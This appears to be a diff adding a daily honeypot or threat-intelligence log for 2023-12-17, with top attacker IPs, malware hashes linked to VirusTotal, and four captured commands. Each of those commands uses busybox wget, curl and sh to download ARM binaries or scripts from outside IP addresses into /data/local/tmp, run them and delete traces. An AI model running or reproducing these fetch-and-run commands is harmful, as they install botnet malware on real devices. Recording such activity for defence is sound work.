@@ -1,0 +1,21 @@
+Top 5 IPs for 2023-12-17:
+
+110.35.160.105
+110.35.160.154
+110.35.160.95
+116.95.33.220
+110.35.160.61
+
+Malware seen: 
+Hash: 020f1fa6072108c79ed6f553f4f8b08e157bf17f9c260a76353300230fed09f0
+https://www.virustotal.com/gui/file/020f1fa6072108c79ed6f553f4f8b08e157bf17f9c260a76353300230fed09f0
+Hash: 863b22750b132f7756122d3847b9cf47bda53372dcf28c1ed8ad5634eaf59239
+https://www.virustotal.com/gui/file/863b22750b132f7756122d3847b9cf47bda53372dcf28c1ed8ad5634eaf59239
+Hash: 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+
+
+cd /data/local/tmp/; busybox wget http://176.97.210.229/bash.arm7; chmod 777 bash.arm7; ./bash.arm7 taco; rm -rf *
+cd /data/local/tmp/; busybox wget http://103.77.209.64/ab.sh; sh ab.sh; curl http://103.77.209.64/ac.sh; sh ac.sh; wget http://103.77.209.64/aw.sh; sh aw.sh
+cd /data/local/tmp/; rm *; busybox wget http://176.97.210.229/bash.arm7; chmod 777 bash.arm7; ./bash.arm7
+cd /data/local/tmp; busybox wget http://5.181.80.102/armv7l; chmod 777 armv7l; ./armv7l; rm -rf armv7l; busybox wget http://5.181.80.102/bins.sh; sh bins.sh; rm -rf bins.sh
